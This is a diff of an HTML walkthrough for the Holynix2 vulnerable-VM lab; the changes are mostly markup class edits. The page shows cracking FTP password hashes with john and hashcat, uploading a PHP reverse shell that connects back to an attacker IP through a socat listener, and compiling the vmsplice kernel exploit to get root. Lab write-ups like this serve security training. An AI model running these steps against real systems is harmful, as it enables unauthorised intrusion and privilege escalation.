@@ -975,7 +975,7 @@ cat pureftpd.passwd
 <div class="section" id="the-exploit">
 <h2>3.16.3. The Exploit<a class="headerlink" href="#the-exploit" title="Permalink to this headline">¶</a></h2>
 <p>We’re ready to start our exploit. When we’re done we’ll have to remember to switch DNS resolution back, then undo the impersonation:</p>
-<div class="highlight-bash"><div class="highlight"><pre><span></span><span class="c1"># undo the the networking changes</span>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span><span class="c1"># undo the the networking changes</span>
 <span class="nv">$SUDO</span> ip route del <span class="nv">$T</span>/32
 ip route show
 <span class="nv">$SUDO</span> ip addr del <span class="nv">$TRUSTED</span> dev <span class="nv">$IF</span>
@@ -988,7 +988,7 @@ ip addr show <span class="nv">$IF</span>
 <p>Our goal is root and there are 2 basic possibilities: via SSH or FTP.</p>
 <ul>
 <li><p class="first">SSH</p>
-<p>SSH seems like the more direct route but requires online password cracking, which is notoriously slow and relies on weak passwords. Of the 30 userid’s harvested from DNS, only 5 have shell access and their passwords are safely tucked away in <code class="file docutils literal"><span class="pre">/etc/shadow</span></code>. We could attempt to crack their FTP hashes with hopes that their SSH passwords are the same. Unfortunately, a 4 hour offline run only succeeded in cracking 3 of the 30 FTP hashes and none of those were for users who had shell access.</p>
+<p>SSH seems like the more direct route but requires online password cracking, which is notoriously slow and relies on weak passwords. Of the 30 userid’s harvested from DNS, only 5 have shell access and their passwords are safely tucked away in <code class="file docutils literal notranslate"><span class="pre">/etc/shadow</span></code>. We could attempt to crack their FTP hashes with hopes that their SSH passwords are the same. Unfortunately, a 4 hour offline run only succeeded in cracking 3 of the 30 FTP hashes and none of those were for users who had shell access.</p>
 </li>
 <li><p class="first">FTP</p>
 <p>The idea here is to FTP up a reverse shell to get basic shell access, then run an exploit to get root. Before we can use FTP a valid userid/password is required. We already have the FTP password hashes for password cracking; only 1 weak password out of 30 is needed to exploit a reverse PHP shell.</p>
@@ -997,8 +997,8 @@ ip addr show <span class="nv">$IF</span>
 </div>
 <div class="section" id="cracking-the-ftp-password-hashes">
 <h3>3.16.3.2. Cracking the FTP password hashes<a class="headerlink" href="#cracking-the-ftp-password-hashes" title="Permalink to this headline">¶</a></h3>
-<p>We could use <strong class="program">john</strong> or <strong class="program">hashcat</strong> to crack the passwords. We’ll use <code class="file docutils literal"><span class="pre">/usr/share/wordlists/rockyou.</span> <span class="pre">:program:`john</span></code> works directly with <code class="file docutils literal"><span class="pre">pureftpd.passwd</span></code> while <strong class="program">hashcat</strong> requires identifying the hash type (500) with the input file having the hash field only.</p>
-<div class="highlight-bash"><div class="highlight"><pre><span></span><span class="nb">cd</span> <span class="nv">$PT</span>/passwords
+<p>We could use <strong class="program">john</strong> or <strong class="program">hashcat</strong> to crack the passwords. We’ll use <code class="file docutils literal notranslate"><span class="pre">/usr/share/wordlists/rockyou.</span> <span class="pre">:program:`john</span></code> works directly with <code class="file docutils literal notranslate"><span class="pre">pureftpd.passwd</span></code> while <strong class="program">hashcat</strong> requires identifying the hash type (500) with the input file having the hash field only.</p>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span><span class="nb">cd</span> <span class="nv">$PT</span>/passwords
 zcat /usr/share/wordlists/rockyou.txt.gz &gt; rockyou.txt
 <span class="c1"># running john is as simple as</span>
 <span class="c1"># /usr/sbin/john --wordlist=rockyou.txt pureftpd.passwd | tee cracked-john.txt</span>
@@ -1009,8 +1009,8 @@ cut -d: -f2 pureftpd.passwd &gt; hashes.txt
 hashcat --hash-type<span class="o">=</span><span class="nv">$MODE</span> hashes.txt rockyou.txt  <span class="p">|</span> tee cracked.txt
 </pre></div>
 </div>
-<p>This quickly got the following password hash cracked. (Enter <code class="kbd docutils literal"><span class="pre">Control-c</span></code> after first password hash is cracked.):</p>
-<div class="highlight-console"><div class="highlight"><pre><span></span><span class="gp">hacker@kali:~/pentest/holynix2/passwords$ cd $</span>PT/passwords
+<p>This quickly got the following password hash cracked. (Enter <kbd class="kbd docutils literal notranslate">Control-c</kbd> after first password hash is cracked.):</p>
+<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="gp">hacker@kali:~/pentest/holynix2/passwords$ cd $</span>PT/passwords
 <span class="gp">hacker@kali:~/pentest/holynix2/passwords$</span> zcat /usr/share/wordlists/rockyou.txt.gz &gt; rockyou.txt
 <span class="gp">hacker@kali:~/pentest/holynix2/passwords$ #</span> running john is as simple as
 <span class="gp">hacker@kali:~/pentest/holynix2/passwords$ #</span> /usr/sbin/john --wordlist<span class="o">=</span>rockyou.txt pureftpd.passwd
@@ -1030,7 +1030,7 @@ hashcat --hash-type<span class="o">=</span><span class="nv">$MODE</span> hashes.
 </pre></div>
 </div>
 <p>So user tmartin has the password “millionaire”:</p>
-<div class="highlight-console"><div class="highlight"><pre><span></span><span class="gp">hacker@kali:~/pentest/holynix2/passwords$</span> grep <span class="s1">&#39;$1$3jpH7Yk0$2XmRv6acGEkBjmNQeyzUz.&#39;</span> pureftpd.passwd <span class="p">|</span> cut -d: -f1
+<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="gp">hacker@kali:~/pentest/holynix2/passwords$</span> grep <span class="s1">&#39;$1$3jpH7Yk0$2XmRv6acGEkBjmNQeyzUz.&#39;</span> pureftpd.passwd <span class="p">|</span> cut -d: -f1
 <span class="go">tmartin</span>
 </pre></div>
 </div>
@@ -1038,7 +1038,7 @@ hashcat --hash-type<span class="o">=</span><span class="nv">$MODE</span> hashes.
 <div class="section" id="uploading-and-executing-the-php-reverse-shell">
 <h3>3.16.3.3. Uploading and executing the php reverse shell<a class="headerlink" href="#uploading-and-executing-the-php-reverse-shell" title="Permalink to this headline">¶</a></h3>
 <p>Let’s upload the php reverse shell:</p>
-<div class="highlight-bash"><div class="highlight"><pre><span></span><span class="nv">ATTACKER</span><span class="o">=</span><span class="m">192</span>.168.1.106
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span><span class="nv">ATTACKER</span><span class="o">=</span><span class="m">192</span>.168.1.106
 <span class="nv">PORT</span><span class="o">=</span><span class="m">9999</span>
 <span class="nb">cd</span> <span class="nv">$PT</span>/exploit
 <span class="nv">FTPUSER</span><span class="o">=</span>tmartin
@@ -1056,7 +1056,7 @@ curl --silent --upload-file <span class="nv">$UPLOAD</span> <span class="se">\</
 </pre></div>
 </div>
 <p>Running this gives us:</p>
-<div class="highlight-console"><div class="highlight"><pre><span></span><span class="gp">hacker@kali:~/pentest/holynix2/exploit$</span> <span class="nv">ATTACKER</span><span class="o">=</span><span class="m">192</span>.168.1.106
+<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="gp">hacker@kali:~/pentest/holynix2/exploit$</span> <span class="nv">ATTACKER</span><span class="o">=</span><span class="m">192</span>.168.1.106
 <span class="gp">hacker@kali:~/pentest/holynix2/exploit$</span> <span class="nv">PORT</span><span class="o">=</span><span class="m">9999</span>
 <span class="gp">hacker@kali:~/pentest/holynix2/passwords$ cd $</span>PT/exploit
 <span class="gp">hacker@kali:~/pentest/holynix2/exploit$</span> <span class="nv">FTPUSER</span><span class="o">=</span>tmartin
@@ -1074,18 +1074,18 @@ curl --silent --upload-file <span class="nv">$UPLOAD</span> <span class="se">\</
 </pre></div>
 </div>
 <p>Now open up a listener in a separate window:</p>
-<div class="highlight-bash"><div class="highlight"><pre><span></span><span class="nv">PORT</span><span class="o">=</span><span class="m">9999</span>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span><span class="nv">PORT</span><span class="o">=</span><span class="m">9999</span>
 socat - tcp-listen:<span class="nv">$PORT</span>
 </pre></div>
 </div>
 <p>Then fire off the reverse shell. Note that this requires you to use the DNS server $T. More recent versions of <strong class="program">curl</strong> have a “–dns-servers” option, but Kali has an old version lacking this.</p>
-<div class="highlight-bash"><div class="highlight"><pre><span></span><span class="c1"># Remember to update DNS to use nameserver $T</span>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span><span class="c1"># Remember to update DNS to use nameserver $T</span>
 <span class="c1"># Or edit /etc/hosts to add &#39;192.168.1.88 tmartin.zincftp.com&#39;</span>
 curl --silent http://<span class="nv">$FTPUSER</span>.zincftp.com/rshell.php
 </pre></div>
 </div>
 <p>If DNS is set up properly you should see a shell open up in to “socat” listener window:</p>
-<div class="highlight-console"><div class="highlight"><pre><span></span><span class="gp">hacker@kali:~/pentest/holynix2/exploit$</span> socat - tcp-listen:9999
+<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="gp">hacker@kali:~/pentest/holynix2/exploit$</span> socat - tcp-listen:9999
 <span class="go">Linux holynix2 2.6.22-14-server #1 SMP Sun Oct 14 23:34:23 GMT 2007 i686 GNU/Linux</span>
 <span class="go"> 22:31:28 up  4:13,  1 user,  load average: 0.00, 0.00, 0.00</span>
 <span class="go">USER     TTY      FROM              LOGIN@   IDLE   JCPU   PCPU WHAT</span>
@@ -1094,17 +1094,17 @@ curl --silent http://<span class="nv">$FTPUSER</span>.zincftp.com/rshell.php
 <span class="go">/bin/sh: can&#39;t access tty; job control turned off</span>
 </pre></div>
 </div>
-<p>As soon as you see the shell open up on the “socat” window you can <code class="kbd docutils literal"><span class="pre">Control-c</span></code> the <code class="docutils literal"><span class="pre">curl</span></code> command:</p>
-<div class="highlight-console"><div class="highlight"><pre><span></span><span class="gp">hacker@kali:~/pentest/holynix2/exploit$</span> curl --silent http://<span class="nv">$FTPUSER</span>.zincftp.com/rshell.php
+<p>As soon as you see the shell open up on the “socat” window you can <kbd class="kbd docutils literal notranslate">Control-c</kbd> the <code class="docutils literal notranslate"><span class="pre">curl</span></code> command:</p>
+<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="gp">hacker@kali:~/pentest/holynix2/exploit$</span> curl --silent http://<span class="nv">$FTPUSER</span>.zincftp.com/rshell.php
 <span class="go">^C</span>
 </pre></div>
 </div>
 </div>
 <div class="section" id="getting-to-root">
 <h3>3.16.3.4. Getting to root<a class="headerlink" href="#getting-to-root" title="Permalink to this headline">¶</a></h3>
-<p>A search for “ubuntu 8.04 kernel 2.6.22 exploit” hit <a class="reference external" href="https://bugs.launchpad.net/ubuntu/+source/linux-source-2.6.22/+bug/190587">Local root exploit in kernel 2.6.17 - 2.6.24 (vmsplice)</a>. The source code for vmsplice can be viewed online at <a class="reference external" href="https://www.exploit-db.com/exploits/5093/">Linux Kernel 2.6.23 &lt;= 2.6.24 - vmsplice Local Root Exploit</a> and other root exploits can be found at <a class="reference external" href="http://www.win.tue.nl/~aeb/linux/hh/hh-12.html">Hackers Hut 12. Local root exploits</a>. Download the following in the source file <a class="reference download internal" href="../_downloads/holynix2-exploit.c" download=""><code class="xref download docutils literal"><span class="pre">holynix2-exploit.c</span></code></a> to the $PT/exploit directory.</p>
+<p>A search for “ubuntu 8.04 kernel 2.6.22 exploit” hit <a class="reference external" href="https://bugs.launchpad.net/ubuntu/+source/linux-source-2.6.22/+bug/190587">Local root exploit in kernel 2.6.17 - 2.6.24 (vmsplice)</a>. The source code for vmsplice can be viewed online at <a class="reference external" href="https://www.exploit-db.com/exploits/5093/">Linux Kernel 2.6.23 &lt;= 2.6.24 - vmsplice Local Root Exploit</a> and other root exploits can be found at <a class="reference external" href="http://www.win.tue.nl/~aeb/linux/hh/hh-12.html">Hackers Hut 12. Local root exploits</a>. Download the following in the source file <a class="reference download internal" href="../_downloads/holynix2-exploit.c" download=""><code class="xref download docutils literal notranslate"><span class="pre">holynix2-exploit.c</span></code></a> to the $PT/exploit directory.</p>
 <p>Upload the file via FTP</p>
-<div class="highlight-bash"><div class="highlight"><pre><span></span><span class="nb">cd</span> <span class="nv">$PT</span>/exploit
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span><span class="nb">cd</span> <span class="nv">$PT</span>/exploit
 <span class="nv">FTPUSER</span><span class="o">=</span>tmartin
 <span class="nv">PASSWORD</span><span class="o">=</span>millionaire
 <span class="c1"># Upload holynix2-exploit.c</span>
@@ -1114,7 +1114,7 @@ curl --silent --upload-file <span class="nv">$UPLOAD</span> <span class="se">\</
 </pre></div>
 </div>
 <p>Then in the socat listener window continue on in the reverse shell:</p>
-<div class="highlight-bash"><div class="highlight"><pre><span></span>python -c <span class="s1">&#39;import pty; pty.spawn(&quot;/bin/bash&quot;)&#39;</span>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>python -c <span class="s1">&#39;import pty; pty.spawn(&quot;/bin/bash&quot;)&#39;</span>
 cp ~tmartin/web/holynix2-exploit.c /tmp/
 <span class="nb">cd</span> /tmp
 gcc holynix2-exploit.c -o exploit
@@ -1125,7 +1125,7 @@ id
 </pre></div>
 </div>
 <p>Running this gives:</p>
-<div class="highlight-console"><div class="highlight"><pre><span></span><span class="gp">$</span> python -c <span class="s1">&#39;import pty; pty.spawn(&quot;/bin/bash&quot;)&#39;</span>
+<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="gp">$</span> python -c <span class="s1">&#39;import pty; pty.spawn(&quot;/bin/bash&quot;)&#39;</span>
 <span class="gp">www-data@holynix2:/$</span> cp ~tmartin/web/holynix2-exploit.c /tmp/
 <span class="go">cp ~tmartin/web/holynix2-exploit.c /tmp/</span>
 <span class="go">cd /tmp</span>
@@ -1165,8 +1165,8 @@ id
 </div>
 <div class="section" id="cleaning-up">
 <h3>3.16.3.5. Cleaning up<a class="headerlink" href="#cleaning-up" title="Permalink to this headline">¶</a></h3>
-<p>Unless you’re planning on doing the following pentest calisthenics, it’s time to clean up the network setup. First, change DNS resolution back to normal (probably editing <code class="file docutils literal"><span class="pre">/etc/resolv.conf</span></code>). Then remove any extra ip addresses and routing:</p>
-<div class="highlight-bash"><div class="highlight"><pre><span></span><span class="nv">IF</span><span class="o">=</span>eth0
+<p>Unless you’re planning on doing the following pentest calisthenics, it’s time to clean up the network setup. First, change DNS resolution back to normal (probably editing <code class="file docutils literal notranslate"><span class="pre">/etc/resolv.conf</span></code>). Then remove any extra ip addresses and routing:</p>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span><span class="nv">IF</span><span class="o">=</span>eth0
 <span class="nv">T</span><span class="o">=</span><span class="m">192</span>.168.1.88
 <span class="nv">TRUSTED</span><span class="o">=</span><span class="m">192</span>.168.1.34
 <span class="c1"># undo the the networking changes</span>
@@ -1185,7 +1185,7 @@ ip addr show <span class="nv">$IF</span>
 <h3>3.16.4.1. User list from the DNS axfr<a class="headerlink" href="#user-list-from-the-dns-axfr" title="Permalink to this headline">¶</a></h3>
 <p>This is not needed for this exploit, but illustrates both a dead end the author took and some useful techniques.</p>
 <p>First a little script-fu gets us our FTP users list from the DNS axfr file:</p>
-<div class="highlight-bash"><div class="highlight"><pre><span></span><span class="nb">cd</span> <span class="nv">$PT</span>/passwords
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span><span class="nb">cd</span> <span class="nv">$PT</span>/passwords
 cut -d<span class="s1">$&#39;\t&#39;</span> -f1 ../dns/dns_axfr.txt <span class="p">|</span> <span class="se">\</span>
   sed <span class="s1">&#39;s/\.zincftp\.com\..*//&#39;</span> <span class="p">|</span> <span class="se">\</span>
   egrep -v <span class="s1">&#39;(^;|^dev$|^mta$|^ns1$|^ns2$|^trusted$|^www$|^zincftp\.com\.$|^$)&#39;</span> <span class="se">\</span>
@@ -1268,7 +1268,7 @@ cut -d<span class="s1">$&#39;\t&#39;</span> -f1 ../dns/dns_axfr.txt <span class=
 <div class="section" id="could-we-brute-force-the-user-ids">
 <h3>3.16.4.2. Could we brute-force the user ids?<a class="headerlink" href="#could-we-brute-force-the-user-ids" title="Permalink to this headline">¶</a></h3>
 <p>Suppose our DNS axfr failed. Could a significant part of the user list be brute-forced? Let’s assume we guessed the user ids were first initial, last name and used the <a class="reference external" href="http://downloads.skullsecurity.org/passwords/facebook-f.last-withcount.txt.bz2">First initial last names - w/ count</a> file from <a class="reference external" href="https://wiki.skullsecurity.org/Passwords">Passwords</a>. How many would we have gotten after a reasonable number of DNS queries?</p>
-<div class="highlight-bash"><div class="highlight"><pre><span></span>curl --silent --remote-name http://downloads.skullsecurity.org/passwords/facebook-f.last-withcount.txt.bz2
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>curl --silent --remote-name http://downloads.skullsecurity.org/passwords/facebook-f.last-withcount.txt.bz2
 tar -xvjf facebook-f.last-withcount.txt.bz2
 <span class="nv">NAMES</span><span class="o">=</span><span class="s2">&quot;ahuxley amckinley bzimmerman cbergey cfinnerly&quot;</span>
 <span class="nv">NAMES</span><span class="o">=</span><span class="s2">&quot; </span><span class="nv">$NAMES</span><span class="s2"> cjalong cmahong cmanson ddonnovan ddypsky&quot;</span>
@@ -1285,7 +1285,7 @@ tar -xvjf facebook-f.last-withcount.txt.bz2
 </pre></div>
 </div>
 <p>When running the check we saw:</p>
-<div class="highlight-console"><div class="highlight"><pre><span></span><span class="go">checking ahuxley</span>
+<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">checking ahuxley</span>
 <span class="go">158988:     97 ahuxley</span>
 <span class="go">checking amckinley</span>
 <span class="go">27746:    535 amckinley</span>
@@ -1344,7 +1344,7 @@ tar -xvjf facebook-f.last-withcount.txt.bz2
 </pre></div>
 </div>
 <p>So out of the 30 user ids, 4 were not in the Facebook list. But to get those we would have had to check 6,256,367 names. If we only checked the top 1,000 names (15 seconds) we would have found only 2 names; 10,000 names (2.5 minutes) would yield 5; 100,000 (25 minutes, presumably) would yield 15 (half) and would pick up the userid tmartin (whose password was first hacked). If looking for some id’s to try, that would be enough to start. Here the script to time 100,000 checks:</p>
-<div class="highlight-bash"><div class="highlight"><pre><span></span><span class="nv">D</span><span class="o">=</span><span class="k">$(</span>date<span class="k">)</span>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span><span class="nv">D</span><span class="o">=</span><span class="k">$(</span>date<span class="k">)</span>
 <span class="nv">N</span><span class="o">=</span><span class="m">0</span>
 <span class="nv">NCHECK</span><span class="o">=</span><span class="m">100000</span>
 <span class="k">while</span> <span class="nb">read</span> LINE<span class="p">;</span> <span class="k">do</span>
@@ -1361,9 +1361,9 @@ date
 <div class="section" id="what-s-on-the-user-s-ftp-web-page">
 <h3>3.16.4.3. What’s on the user’s FTP web page?<a class="headerlink" href="#what-s-on-the-user-s-ftp-web-page" title="Permalink to this headline">¶</a></h3>
 <p>Finding exploitable content on the user’s home page appears to have been a dead end. But to illustrate how you’d automate that we include it in the writeup.</p>
-<p>Change your DNS resolution to use $T since fetching the user’s home page requires using the FQDN. For Kali that implies changing your <code class="file docutils literal"><span class="pre">/etc/resolv.conf</span></code> to have “nameserver” point to $T.</p>
-<p>Let’s pick out the links on the user home pages using <a class="reference external" href="http://www.crummy.com/software/BeautifulSoup/bs4/doc/">Beautiful Soup</a>. That requires the following python file named <code class="docutils literal"><span class="pre">getlinks.py</span></code> in the directory $PT/files and making it executable:</p>
-<div class="highlight-python"><div class="highlight"><pre><span></span><span class="ch">#!/usr/bin/env python</span>
+<p>Change your DNS resolution to use $T since fetching the user’s home page requires using the FQDN. For Kali that implies changing your <code class="file docutils literal notranslate"><span class="pre">/etc/resolv.conf</span></code> to have “nameserver” point to $T.</p>
+<p>Let’s pick out the links on the user home pages using <a class="reference external" href="http://www.crummy.com/software/BeautifulSoup/bs4/doc/">Beautiful Soup</a>. That requires the following python file named <code class="docutils literal notranslate"><span class="pre">getlinks.py</span></code> in the directory $PT/files and making it executable:</p>
+<div class="highlight-python notranslate"><div class="highlight"><pre><span></span><span class="ch">#!/usr/bin/env python</span>
 <span class="kn">import</span> <span class="nn">argparse</span>
 <span class="kn">import</span> <span class="nn">urlparse</span>
 <span class="kn">import</span> <span class="nn">urllib2</span>
@@ -1389,7 +1389,7 @@ date
 </pre></div>
 </div>
 <p>Using the python program, download the files for inspection:</p>
-<div class="highlight-bash"><div class="highlight"><pre><span></span><span class="nb">cd</span> <span class="nv">$PT</span>/files
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span><span class="nb">cd</span> <span class="nv">$PT</span>/files
 mkdir -p downloads
 sed <span class="s1">&#39;s/^/http:\/\//;s/$/.zincftp.com\//&#39;</span> <span class="nv">$PT</span>/passwords/users.txt &gt; urls.txt
 cat urls.txt <span class="p">|</span> xargs -n <span class="m">1</span> ./getlinks.py <span class="p">|</span> <span class="se">\</span>
@@ -1404,7 +1404,7 @@ file -k downloads/*
 </pre></div>
 </div>
 <p>Running this gives us:</p>
-<div class="highlight-console"><div class="highlight"><pre><span></span><span class="gp">hacker@kali:~/pentest/holynix2/passwords$ cd $</span>PT/files
+<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="gp">hacker@kali:~/pentest/holynix2/passwords$ cd $</span>PT/files
 <span class="gp">hacker@kali:~/pentest/holynix2/files$</span> mkdir -p downloads
 <span class="gp">hacker@kali:~/pentest/holynix2/files$</span> sed <span class="s1">&#39;s/^/http:\/\//;s/$/.zincftp.com\//&#39;</span> <span class="nv">$PT</span>/users/users.txt &gt; urls.txt
 <span class="gp">hacker@kali:~/pentest/holynix2/files$</span> cat urls.txt <span class="p">|</span> xargs -n <span class="m">1</span> ./getlinks.py <span class="p">|</span> <span class="se">\</span>
@@ -1482,7 +1482,7 @@ file -k downloads/*
 </pre></div>
 </div>
 <p>Once you’ve downloaded all the files you can switch DNS name resolution back. A quick peek at the downloaded files didn’t show any obvious exploit material.</p>
-<p>After inspecting the downloaded files nothing of immediate consequence stands out. The <code class="file docutils literal"><span class="pre">resume.txt</span></code> flagged user ddonnovan as a potential administrative user along with lwestre for the “.gz” files and rcropper for <code class="file docutils literal"><span class="pre">phase10_win32_0.1.zip</span></code>.</p>
+<p>After inspecting the downloaded files nothing of immediate consequence stands out. The <code class="file docutils literal notranslate"><span class="pre">resume.txt</span></code> flagged user ddonnovan as a potential administrative user along with lwestre for the “.gz” files and rcropper for <code class="file docutils literal notranslate"><span class="pre">phase10_win32_0.1.zip</span></code>.</p>
 </div>
 </div>
 </div>
